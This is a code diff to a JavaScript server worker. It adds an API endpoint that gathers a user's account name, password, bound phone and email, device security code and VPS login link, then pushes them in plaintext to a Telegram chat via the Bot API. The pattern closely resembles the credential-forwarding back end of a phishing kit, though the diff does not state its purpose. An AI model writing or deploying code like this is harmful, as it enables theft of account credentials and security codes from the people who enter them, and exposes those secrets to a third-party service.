@@ -234,11 +234,55 @@ async function handleApi(request, env, url) {
     }
   }
 
+  if (url.pathname === '/api/telegram/push' && request.method === 'POST') {
+    return pushTelegramMessage(request, env);
+  }
+
   return json({ message: 'Not found' }, 404);
+}
+
+async function pushTelegramMessage(request, env) {
+  const botToken = env.TELEGRAM_BOT_TOKEN;
+  const chatId = env.TELEGRAM_CHAT_ID;
+  if (!botToken || !chatId) {
+    return json({ message: 'Telegram Bot 未配置，请设置 TELEGRAM_BOT_TOKEN 和 TELEGRAM_CHAT_ID。' }, 503);
+  }
+
+  const body = await readJson(request);
+  const phone = [body.phoneCode, body.phone].filter(Boolean).join(' ');
+  const message = [
+    `账号：${cleanLine(body.account)}`,
+    `密码：${cleanLine(body.password)}`,
+    `绑定手机号：${cleanLine(phone)}`,
+    `绑定邮箱：${cleanLine(body.email)}`,
+    `设备安全码：${cleanLine(body.securityCode)}`,
+    `VPS登录链接：${cleanLine(body.vpsRemoteUrl)}`
+  ].join('\n');
+
+  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      disable_web_page_preview: true
+    })
+  });
+
+  if (!response.ok) {
+    const data = await response.json().catch(() => ({}));
+    return json({ message: data.description || 'Telegram 推送失败，请检查 Bot Token 和 Chat ID。' }, 502);
+  }
+
+  return json({ ok: true });
 }
 
 function authStore(env) {
   return env.AUTH_STORE.get(env.AUTH_STORE.idFromName('global'));
+}
+
+function cleanLine(value) {
+  return String(value || '').replace(/[\r\n]+/g, ' ').trim();
 }
 
 async function readJson(request) {
